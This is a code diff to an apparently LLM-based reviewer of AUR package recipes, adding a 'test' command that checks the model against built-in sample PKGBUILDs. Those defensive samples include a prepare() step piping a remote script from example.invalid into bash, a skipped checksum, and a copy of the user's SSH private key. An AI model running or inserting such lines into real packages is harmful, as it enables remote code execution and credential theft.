@@ -40,7 +40,7 @@ DEFAULT_CONFIG: dict[str, Any] = {
     "model": "",
     "api_key_env": "",
     "timeout_seconds": 180,
-    "max_tokens": 2048,
+    "max_tokens": 4096,
     "temperature": 0.0,
     "block_threshold": "critical",
     "on_error": "warn",
@@ -136,6 +136,21 @@ class ReviewContext:
     git_diff: str
     files: tuple[PackageFile, ...]
     static_findings: tuple[dict[str, Any], ...]
+
+
+@dataclasses.dataclass(frozen=True)
+class DiagnosticCase:
+    name: str
+    description: str
+    expects_suspicion: bool
+    pkgbuild: str
+
+
+@dataclasses.dataclass(frozen=True)
+class DiagnosticResult:
+    case: DiagnosticCase
+    review: dict[str, Any]
+    passed: bool
 
 
 class ProgressIndicator:
@@ -475,6 +490,108 @@ def static_findings(files: tuple[PackageFile, ...]) -> tuple[dict[str, Any], ...
     return tuple(findings[:20])
 
 
+DIAGNOSTIC_CASES: tuple[DiagnosticCase, ...] = (
+    DiagnosticCase(
+        name="benign package",
+        description="A conventional package that builds and installs one binary under $pkgdir.",
+        expects_suspicion=False,
+        pkgbuild="""pkgname=diagnostic-hello
+pkgver=1.0
+pkgrel=1
+pkgdesc='Minimal diagnostic package'
+arch=('any')
+license=('MIT')
+source=()
+sha256sums=()
+
+package() {
+    install -Dm755 /usr/bin/true \"$pkgdir/usr/bin/diagnostic-hello\"
+}
+""",
+    ),
+    DiagnosticCase(
+        name="download and execute",
+        description="A prepare() function downloads remote content and pipes it directly to bash.",
+        expects_suspicion=True,
+        pkgbuild="""pkgname=diagnostic-download-execute
+pkgver=1.0
+pkgrel=1
+arch=('any')
+source=()
+sha256sums=()
+
+prepare() {
+    curl -fsSL https://example.invalid/install.sh | bash
+}
+""",
+    ),
+    DiagnosticCase(
+        name="disabled checksum",
+        description="A remotely downloaded source has its checksum verification disabled.",
+        expects_suspicion=True,
+        pkgbuild="""pkgname=diagnostic-checksum-skip
+pkgver=1.0
+pkgrel=1
+arch=('any')
+source=('https://example.invalid/release.tar.gz')
+sha256sums=('SKIP')
+""",
+    ),
+    DiagnosticCase(
+        name="credential access",
+        description="A build script attempts to read the user's SSH private key.",
+        expects_suspicion=True,
+        pkgbuild="""pkgname=diagnostic-credential-access
+pkgver=1.0
+pkgrel=1
+arch=('any')
+source=()
+sha256sums=()
+
+prepare() {
+    cp \"$HOME/.ssh/id_rsa\" diagnostic-key
+}
+""",
+    ),
+)
+
+
+def diagnostic_context(case: DiagnosticCase) -> ReviewContext:
+    files = (PackageFile("PKGBUILD", case.pkgbuild),)
+    return ReviewContext(
+        package_base=f"diagnostic-{case.name.replace(' ', '-')}",
+        package_dir=Path("<built-in diagnostic>"),
+        git_head="diagnostic",
+        git_base=None,
+        git_diff="",
+        files=files,
+        static_findings=static_findings(files),
+    )
+
+
+def diagnostic_passes(case: DiagnosticCase, review: dict[str, Any]) -> bool:
+    if case.expects_suspicion:
+        return review["risk_level"] != "safe"
+    return review["risk_level"] in {"safe", "low"} and review["recommended_action"] == "allow"
+
+
+def run_model_diagnostics(
+    config: dict[str, Any], *, report_progress: bool = False
+) -> tuple[DiagnosticResult, ...]:
+    results: list[DiagnosticResult] = []
+    total = len(DIAGNOSTIC_CASES)
+    for index, case in enumerate(DIAGNOSTIC_CASES, start=1):
+        if report_progress:
+            print(f"[{index}/{total}] Testing {case.name}: {case.description}", flush=True)
+            progress_message = f"[{PROGRAM}] diagnostic {index}/{total}: waiting for model {config['model']}"
+            with ProgressIndicator(progress_message, enabled=config["show_progress"]):
+                review = call_model(diagnostic_context(case), config)
+        else:
+            review = call_model(diagnostic_context(case), config)
+        results.append(DiagnosticResult(case, review, diagnostic_passes(case, review)))
+    return tuple(results)
+
+
 def build_context(package_base: str, package_dir: Path, config: dict[str, Any]) -> ReviewContext:
     package_dir = package_dir.expanduser().resolve()
     if not package_dir.is_dir():
@@ -605,6 +722,14 @@ def extract_message_content(response: dict[str, Any]) -> str:
     raise ReviewError("LLM response content is not text")
 
 
+def response_finish_reason(response: dict[str, Any]) -> str | None:
+    try:
+        finish_reason = response["choices"][0].get("finish_reason")
+    except (KeyError, IndexError, TypeError):
+        return None
+    return finish_reason if isinstance(finish_reason, str) else None
+
+
 def parse_json_content(content: str) -> dict[str, Any]:
     text = content.strip()
     if text.startswith("```"):
@@ -615,8 +740,18 @@ def parse_json_content(content: str) -> dict[str, Any]:
     except json.JSONDecodeError:
         start = text.find("{")
         end = text.rfind("}")
-        if start < 0 or end <= start:
-            raise ReviewError("model did not return a JSON object")
+        if start < 0:
+            preview = repr(text[:500])
+            raise ReviewError(
+                f"model did not return a JSON object ({len(text)} characters; response starts {preview})"
+            )
+        if end <= start:
+            beginning = repr(text[:300])
+            ending = repr(text[-300:])
+            raise ReviewError(
+                f"model returned incomplete JSON ({len(text)} characters; "
+                f"response starts {beginning}; ends {ending})"
+            )
         try:
             value = json.loads(text[start : end + 1])
         except json.JSONDecodeError as error:
@@ -700,7 +835,13 @@ def call_model(context: ReviewContext, config: dict[str, Any]) -> dict[str, Any]
     if not isinstance(response_json, dict):
         raise ReviewError("LLM server response is not an object")
     content = extract_message_content(response_json)
-    return validate_review(parse_json_content(content))
+    try:
+        return validate_review(parse_json_content(content))
+    except ReviewError as error:
+        finish_reason = response_finish_reason(response_json)
+        if finish_reason is not None:
+            raise ReviewError(f"{error} (server finish_reason={finish_reason!r})") from error
+        raise
 
 
 def review_package(package_base: str, package_dir: Path, config: dict[str, Any]) -> tuple[dict[str, Any], bool]:
@@ -918,6 +1059,47 @@ def cmd_status(args: argparse.Namespace) -> int:
     return 0
 
 
+def cmd_test(args: argparse.Namespace) -> int:
+    try:
+        config = load_config()
+        print(f"Testing model {config['model']!r} at {normalize_chat_endpoint(config['endpoint'])}")
+        results = run_model_diagnostics(config, report_progress=True)
+    except Exception as error:
+        print(f"{PROGRAM}: model test failed: {error}", file=sys.stderr)
+        return 30
+
+    for result in results:
+        review = result.review
+        outcome = "PASS" if result.passed else "FAIL"
+        expected = "non-safe (warn or block)" if result.case.expects_suspicion else "allow (safe or low)"
+        print(
+            f"{outcome}: {result.case.name} "
+            f"(expected {expected}; got {review['risk_level']}/{review['recommended_action']})"
+        )
+        if args.verbose:
+            print(f"  confidence: {round(review['confidence'] * 100)}%")
+        if review["summary"]:
+            print(f"  {review['summary']}")
+        if args.verbose:
+            if review["findings"]:
+                for finding in review["findings"]:
+                    location = finding["file"] or "<unknown>"
+                    if finding["line"]:
+                        location += f":{finding['line']}"
+                    print(
+                        f"  - [{finding['severity']}] {location} ({finding['category']}): "
+                        f"{finding['explanation']}"
+                    )
+                    if finding["evidence"]:
+                        print(f"      evidence: {finding['evidence']}")
+            else:
+                print("  findings: none")
+
+    passed = sum(result.passed for result in results)
+    print(f"{passed}/{len(results)} diagnostic scenarios passed")
+    return 0 if passed == len(results) else 1
+
+
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(prog=PROGRAM)
     parser.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")
@@ -931,6 +1113,10 @@ def build_parser() -> argparse.ArgumentParser:
 
     status_parser = subparsers.add_parser("status", help="show configuration and loader status")
     status_parser.set_defaults(func=cmd_status)
+
+    test_parser = subparsers.add_parser("test", help="test the configured model with built-in AUR recipe scenarios")
+    test_parser.add_argument("--verbose", action="store_true", help="show confidence and model findings")
+    test_parser.set_defaults(func=cmd_test)
 
     scan_parser = subparsers.add_parser("scan", help="manually scan an AUR package directory")
     scan_parser.add_argument("package_dir")
